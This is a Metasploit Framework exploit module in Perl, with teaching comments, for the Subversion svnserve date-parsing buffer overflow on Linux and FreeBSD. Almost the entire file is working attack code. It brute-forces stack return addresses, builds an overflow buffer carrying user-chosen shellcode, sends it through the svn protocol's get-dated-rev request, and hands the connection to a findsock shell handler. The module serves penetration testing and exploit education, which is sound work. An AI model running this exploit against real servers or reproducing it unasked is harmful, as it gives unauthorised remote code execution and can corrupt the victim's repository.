
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

# Extra Annotated Version

package Msf::Exploit::svnserve_date;
use strict;
use base 'Msf::Exploit';
use Pex::Text;

my $advanced = {
  # Where to start brute forcing, different between linux/bsd
  'StackTop'     => ['', 'Start address for stack ret bruteforcing, empty for defaults from target'],

  # Where to stop brute forcing
  'StackBottom'  => ['', 'End address for stack ret bruteforcing, empty for defaults from target'],

  # The increment used during brute forcing, autocalculation is important!
  'StackStep'    => [0, 'Step size for ret bruteforcing, 0 for auto calculation.'],

  # How long to wait inbetween brute force attempts, good to give things a
  # chance to clean up, and also give the handlers a chance to process a
  # possible connection.
  'BruteWait'    => [.4, 'Length in seconds to wait between brute force attempts'],

  # An exploit vector value, probably not going to be changed by normal users
  # This was like 62 on my machine and 88 on HD's
  'RetLength'    => [100, 'Length of rets after payload'],

  # Depending on some setups of svnserve, we may get an error (like segfault
  # return message) and stop processing, ignore this.
  'IgnoreErrors' => [0, 'Keep going even after critical errors.'],
};

my $info = {
  'Name'    => 'Subversion Date Svnserve',
  'Version'  => '$Revision$',
  'Authors' => [ 'spoonm <ninjatools [at] hush.com>', ],
  'Arch'    => [ 'x86' ],
  
  # We support both linux and bsd, allowing a user to pick linux or bsd
  # payloads.  An important thing to realize is in this exploit we don't
  # check to make sure they didn't pick a linux target and bsd payload, we
  # trust the user made the correct decision.  If you wanted to enforce it
  # you coulde override the OS method and return based on the current selected
  # target from the environment.
  'OS'      => [ 'linux', 'bsd' ],

  # Unfortunately svnserve usually doesn't run as root.
  'Priv'    => 0,

  # Setup our options.  Use type 'DATA' for values you don't want the Framework
  # to validate (it will make sure it's defined if required) or mangle.
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The svnserve port', 3690],
      'URL'   => [1, 'DATA', 'SVN URL (ie svn://host/repos)', 'svn://host/svn/repos'],
    },

  # Setup our payload details, listing our bad characters (its a sscanf bug)
  # and informing the framework that we support findsock.
  'Payload' =>
    {
      'Space'     => 500,
      'BadChars'  => "\x00\x09\x0a\x0b\x0c\x0d\x20",
      'MinNops'   => 16, # This keeps brute forcing sane
      'Keys'      => ['+findsock'],
    },

  # This will otherwise be defaulted to esp and ebp.  We don't really ever
  # need a sane ebp in linux/bsd land, so just save esp. (So we have a sane
  # stack).
  'Nop' =>
    {
      'SaveRegs' => ['esp'],
    },
  'Description'  => Pex::Text::Freeform(qq{
      This is an exploit for the Subversion date parsing overflow.  This
      exploit is for the svnserve daemon (svn:// protocol) and will not work
      for Subversion over webdav (http[s]://).  This exploit should never
      crash the daemon, and should be safe to do multi-hits.

      **WARNING** This exploit seems to (not very often, I've only seen
      it during testing) corrupt the subversion database, so be careful!
    }),
  'Refs'  =>
    [
      'http://osvdb.org/6301',
      'http://lists.netsys.com/pipermail/full-disclosure/2004-May/021737.html',
    ],

  # Since we support more than one target, and want to make sure the user
  # is aware and specifically selects one, we default the target to -1
  # which forces the user to make a selection.
  'DefaultTarget' => -1,
  'Targets' =>
    [
      ['Linux Bruteforce', '0xbffffe13', '0xbfff0000'],
      ['FreeBSD Bruteforce', '0xbfbffe13', '0xbfbf0000'],
    ],
};


# Typical new method, nothing fancy, give Info/Advanced to Framework
sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

  return($self);
}

sub Exploit {
  my $self = shift;


  # Pull our UserOpts out of the environment, along with the
  # the targets and the EncodedPayload object used to retrieve the user
  # specified shellcode.
  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  my $targetIndex = $self->GetVar('TARGET');
  my $encodedPayload = $self->GetVar('EncodedPayload');
  my $shellcode   = $encodedPayload->Payload;
  my $target = $self->Targets->[$targetIndex];


  my $retLength   = $self->GetLocal('RetLength');
  my $bruteWait   = $self->GetLocal('BruteWait');
  my $stackTop    = $self->GetLocal('StackTop');
  my $stackBottom = $self->GetLocal('StackBottom');
  my $stackStep   = $self->GetLocal('StackStep');

  # Get our UserOpts URL, and also get CPORT for supporting srcport style
  # findsock payloads.
  my $url         = $self->GetVar('URL');
  my $srcPort     = $self->GetVar('CPORT');
  
  $stackTop    = $target->[1] if(!length($stackTop));
  $stackBottom = $target->[2] if(!length($stackBottom));
  $stackTop    = hex($stackTop);
  $stackBottom = hex($stackBottom);


  # This is important, we default the stack stepping size to the length of
  # the nopsled, making brute forcing as efficent as possible.
  $stackStep = $encodedPayload->NopsLength if($stackStep == 0);
  $stackStep -= $stackStep % 4; # ya ya, whatever

  # Confusing forloop of doom!  Loop through through StackTop and StackBottom
  # calling StepAddress to step the return address and also avoid any bad
  # characters the return address might contain.
  for(my $ret = $stackTop; $ret >= $stackBottom; $ret = $self->StepAddress('Address' => $ret, 'StepSize' => $stackStep)) {

    # Make our socket connection.  Notice the srcport support for findsock!
    my $sock = Msf::Socket::Tcp->new('PeerAddr' => $targetHost, 'PeerPort' => $targetPort, 'LocalPort' => $srcPort);
    if($sock->IsError) {
      $self->PrintLine('Error creating socket: ' . $sock->GetError);
      return;
    }

    # Call PrintLine to print a line to the user telling them what return
    # address we are currently trying.
    $self->PrintLine(sprintf("Trying %#08x", $ret));
    my $evil = (pack('V', $ret) x int($retLength / 4)) . $shellcode;
#    my $evil = 'A' x 300;


    my @data =  (
      '( 2 ( edit-pipeline ) ' . lengther($url) . ' ) ',
      '( ANONYMOUS ( 0: ) ) ',
      '( get-dated-rev ( ' .
    #  lengther('Tue' . 'A' x $ARGV[0] . ' 3 Oct 2000 01:01:01.001 (day 277, dst 1, gmt_off -18000)') . ' ) ) '.
      lengther($evil . ' 3 Oct 2000 01:01:01.001 (day 277, dst 1, gmt_off)') . ' ) ) ',
     '',
    );

    my $i = 0;
    foreach my $data (@data) {
      my $dump = $sock->Recv(-1);

      # PrintDebugLine prints a line only if the DebugLevel is equal to or
      # greater than the first option.  This will print verbose info if your
      # DebugLevel is set to 3 or more.
      $self->PrintDebugLine(3, "dump\n$dump");
      if(!$sock->Send($data) && $i < 3) {
        $self->PrintLine('Error in send.');
        $sock->PrintError;
        $self->PrintLine('This is bad.');
        $self->PrintLine("$dump\n");
        return if(!$self->GetLocal('IgnoreErrors'));
      }
      if($i == 3 && length($dump)) {
        $self->PrintLine("Received data when we should't have, bailing.");
        $self->PrintLine($dump);
        return if(!$self->GetLocal('IgnoreErrors'));
      }
      $i++;
    }

    select(undef, undef, undef, $bruteWait); # ghetto sleep

    # We support findsock, must call Handler to check if there is a waiting
    # shell on the line.  If Handler succeeds in finding a shell, it will
    # never return.
    $self->Handler($sock);

    $sock->Close;
    select(undef, undef, undef, 1) if($srcPort); # ghetto sleep, wait for CPORT
  }
  return;
}

sub lengther {
  my $data = shift;
  return(length($data) . ':' . $data);
}

1;
